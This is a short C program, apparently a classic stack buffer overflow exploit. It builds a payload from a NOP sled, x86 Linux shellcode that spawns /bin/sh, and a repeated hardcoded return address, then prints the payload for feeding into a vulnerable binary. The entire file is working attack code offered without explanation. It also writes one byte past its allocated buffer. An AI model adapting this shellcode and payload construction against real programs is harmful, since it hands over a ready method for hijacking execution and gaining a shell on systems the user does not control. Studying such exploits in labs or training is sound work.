#include <stdio.h>
#include <string.h>

char shellcode[] = 
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
	;

int main(void) {
	char *buff, *ptr;
	long *adrptr; int i;
	buff = malloc(280);
	ptr = buff;
	adrptr = (long *) ptr;
	for (i=0; i<280; i+=4)
		*(adrptr++) = 0x08048453;
	for (i=0; i<260; i++)
		buff[i] = 0x90;
	ptr = buff +
		(260-strlen(shellcode));
	for (i=0; i<strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[280] = '\0';
	printf("%s", buff);
}
